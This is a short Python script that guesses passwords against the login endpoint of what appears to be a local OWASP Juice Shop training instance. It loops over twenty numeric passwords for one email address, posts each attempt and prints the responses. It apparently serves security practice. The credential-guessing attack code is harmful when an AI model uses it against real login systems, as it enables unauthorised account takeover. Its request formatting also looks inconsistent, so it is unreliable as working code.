import requests


def brute_force_attack_password_to_juice_shop():
    # SITE_NAME = 'http://127.0.0.1:5000/#/login'

    for i in range(123450, 123470):
        headers = {"Content-Type": "application/json; charset=utf-8"}
        payload = {'email': 'a@gmail.com', 'password': i}
        session = requests.Session()
        res = session.post('http://localhost:5000/rest/user/login', data=payload,
                           headers=headers)  # TO DO: write into db the password in case of succeed
        print(res.text)


brute_force_attack_password_to_juice_shop()
